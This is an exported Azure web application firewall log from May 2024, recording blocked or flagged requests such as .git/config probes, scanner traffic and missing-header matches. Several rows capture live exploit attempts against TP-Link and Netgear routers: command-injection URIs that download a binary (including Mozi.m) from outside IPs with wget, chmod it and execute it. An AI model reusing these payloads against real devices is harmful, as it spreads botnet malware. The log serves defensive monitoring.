TenantId,"TimeGenerated [Local Time]",OperationName,InstanceId,ClientIp,ClientPort,RequestUri,RuleSetType,RuleSetVersion,RuleId,Message,Action,Site,DetailedMessage,DetailedData,FileDetails,LineDetails,Hostname,TransactionId,SourceSystem,Type,"_ResourceId"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 4:58:53.000 PM",ApplicationGatewayFirewall,"appgw_3","31.7.62.226",,"/.git/config","OWASP CRS","3.2",949110,"Inbound Anomaly Score Exceeded (Total Score: 5)",Blocked,,"Greater and Equal to Tx:inbound_anomaly_score_threshold at TX:anomaly_score.",,"REQUEST-949-BLOCKING-EVALUATION.conf",79,"51.8.97.212",b874681d5c0176a24417e0afb9a9b4c7,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 5:02:29.000 PM",ApplicationGatewayFirewall,"appgw_3","167.94.146.53",,"/",MicrosoftBotProtection,,,"Found bot IP address 167.94.146.53 in RemoteAddr",Blocked,,,,,,"51.8.97.212:80",eff0154237d4724f50b97e164d4849a6,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 5:02:32.000 PM",ApplicationGatewayFirewall,"appgw_1","167.94.146.53",,"/",MicrosoftBotProtection,,,"Found bot IP address 167.94.146.53 in RemoteAddr",Blocked,,,,,,"51.8.97.212",a57a66e416a187851162951abeb29202,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 6:43:07.000 PM",ApplicationGatewayFirewall,"appgw_1","205.210.31.64",,"/","OWASP CRS","3.2",920280,"Request Missing a Host Header",Matched,,"Equal 0 at REQUEST_HEADERS:host.","{ found within [REQUEST_HEADERS:0]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",491,,261d4191b4bb43eabf3f76d976d22817,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 6:51:59.000 PM",ApplicationGatewayFirewall,"appgw_1","195.1.144.109",,"/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.14.226.142/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`)",MicrosoftBotProtection,,,"Found bot IP address 195.1.144.109 in RemoteAddr",Blocked,,,,,,"51.8.97.212:80",4e51770c6f5db9bc6fc461476fb53d82,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 7:28:25.000 PM",ApplicationGatewayFirewall,"appgw_1","31.7.62.226",,"/.git/config.bak",MicrosoftBotProtection,,,"Found bot IP address 31.7.62.226 in RemoteAddr",Blocked,,,,,,"51.8.97.212",e18bef9442bf2ca7fc8e48d643bd945a,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 7:40:42.000 PM",ApplicationGatewayFirewall,"appgw_3","162.216.149.217",,"/","OWASP CRS","3.2",920300,"Request Missing an Accept Header",Matched,,"Equal 0; Pattern match ^OPTIONS$; Pattern match AppleWebKit Android at REQUEST_HEADERS:user-agent.","{ found within [REQUEST_HEADERS:0]} and { found within [REQUEST_METHOD:]} and { found within [REQUEST_HEADERS:]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",1143,"51.8.97.212:80",8424c69a278a380ab5264b421ec01e20,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 7:40:42.000 PM",ApplicationGatewayFirewall,"appgw_3","162.216.149.217",,"/login.php","OWASP CRS","3.2",920300,"Request Missing an Accept Header",Matched,,"Equal 0; Pattern match ^OPTIONS$; Pattern match AppleWebKit Android at REQUEST_HEADERS:user-agent.","{ found within [REQUEST_HEADERS:0]} and { found within [REQUEST_METHOD:]} and { found within [REQUEST_HEADERS:]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",1143,"51.8.97.212:80",08fef53408f87e193ea64b5503460ca1,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 8:05:21.000 PM",ApplicationGatewayFirewall,"appgw_1","84.54.51.41",,"/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.79.193%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)",MicrosoftBotProtection,,,"Found bot IP address 84.54.51.41 in RemoteAddr",Blocked,,,,,,"51.8.97.212:80",f7a7b3fe2c6d0da73823e39a54ee4eed,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 8:51:16.000 PM",ApplicationGatewayFirewall,"appgw_1","104.152.52.200",,"/","OWASP CRS","3.2",949110,"Inbound Anomaly Score Exceeded (Total Score: 8)",Blocked,,"Greater and Equal to Tx:inbound_anomaly_score_threshold at TX:anomaly_score.",,"REQUEST-949-BLOCKING-EVALUATION.conf",79,,7a6eb0b99f6130e6df9ca86aae228ff9,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 8:51:16.000 PM",ApplicationGatewayFirewall,"appgw_1","104.152.52.200",,"/","OWASP CRS","3.2",920280,"Request Missing a Host Header",Matched,,"Equal 0 at REQUEST_HEADERS:host.","{ found within [REQUEST_HEADERS:0]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",491,,7a6eb0b99f6130e6df9ca86aae228ff9,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 8:51:16.000 PM",ApplicationGatewayFirewall,"appgw_1","104.152.52.200",,"/","OWASP CRS","3.2",913100,"Found User-Agent associated with security scanner",Matched,,"Pattern match from file scanners-user-agents.data at REQUEST_HEADERS:user-agent.","{masscan found within [REQUEST_HEADERS:User-Agent:masscan/1.3 (https://github.com/robertdavidgraham/masscan)]}","REQUEST-913-SCANNER-DETECTION.conf",33,,7a6eb0b99f6130e6df9ca86aae228ff9,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 9:01:46.000 PM",ApplicationGatewayFirewall,"appgw_3","46.174.191.28",,"/","OWASP CRS","3.2",920280,"Request Missing a Host Header",Matched,,"Equal 0 at REQUEST_HEADERS:host.","{ found within [REQUEST_HEADERS:0]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",491,,16c2f6b9d4e3ff88284fb7e1db10c8db,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 9:56:26.000 PM",ApplicationGatewayFirewall,"appgw_1","167.71.197.10",,"/cdn-cgi/trace","OWASP CRS","3.2",920300,"Request Missing an Accept Header",Matched,,"Equal 0; Pattern match ^OPTIONS$; Pattern match AppleWebKit Android at REQUEST_HEADERS:user-agent.","{ found within [REQUEST_HEADERS:0]} and { found within [REQUEST_METHOD:]} and { found within [REQUEST_HEADERS:]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",1143,"speed.cloudflare.com",103b0f380877027553e79f09258f0775,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 9:57:49.000 PM",ApplicationGatewayFirewall,"appgw_3","31.7.62.226",,"/.git/config.old",MicrosoftBotProtection,,,"Found bot IP address 31.7.62.226 in RemoteAddr",Blocked,,,,,,"51.8.97.212",1c2c78505a5e6a5a7a620d5c018150e7,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 10:04:46.000 PM",ApplicationGatewayFirewall,"appgw_3","185.16.38.111",,"/","OWASP CRS","3.2",920320,"Missing User Agent Header",Matched,,"Equal 0 at REQUEST_HEADERS:user-agent.","{ found within [REQUEST_HEADERS:0]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",1176,"51.8.97.212:80",66c593ef10227e2e24e8c049a6e4b628,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 11:36:05.000 PM",ApplicationGatewayFirewall,"appgw_1","185.16.38.111",,"/","OWASP CRS","3.2",920320,"Missing User Agent Header",Matched,,"Equal 0 at REQUEST_HEADERS:user-agent.","{ found within [REQUEST_HEADERS:0]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",1176,"51.8.97.212:80",0b7e042c17d3ef0211644c9f223568f0,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 11:48:49.000 PM",ApplicationGatewayFirewall,"appgw_3","205.210.31.134",,"/",MicrosoftBotProtection,,,"Found bot IP address 205.210.31.134 in RemoteAddr",Blocked,,,,,,"51.8.97.212:80",db3dbbb13b795d3830eb7e04b756cb92,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 11:57:21.000 PM",ApplicationGatewayFirewall,"appgw_3","122.194.11.113",,"/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://102.33.92.108:50614/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1","OWASP CRS","3.2",920280,"Request Missing a Host Header",Matched,,"Equal 0 at REQUEST_HEADERS:host.","{ found within [REQUEST_HEADERS:0]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",491,,961892840d32a6217957572bb7a0e680,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 11:57:21.000 PM",ApplicationGatewayFirewall,"appgw_3","122.194.11.113",,"/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://102.33.92.108:50614/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1","OWASP CRS","3.2",920320,"Missing User Agent Header",Matched,,"Equal 0 at REQUEST_HEADERS:user-agent.","{ found within [REQUEST_HEADERS:0]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",1176,,961892840d32a6217957572bb7a0e680,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
